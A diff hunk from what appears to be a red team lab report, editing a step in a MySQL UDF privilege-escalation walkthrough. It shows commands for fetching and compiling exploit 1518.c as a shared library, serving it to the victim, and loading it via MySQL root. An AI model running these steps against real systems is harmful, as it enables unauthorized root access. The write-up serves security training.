@@ -177,7 +177,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
    - `searchsploit –m 1518.c`
    - `gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc`
    - setup python simple server to transfer 1518.so payload to ovictim machine
-      - `Python -m SimpleHTTPServer`
+      - `Python3 -m http.server`
       -  transfer into /tmp directory
    - `mysql -u root -p`
    - `use mysql; create table poo(line blob);`
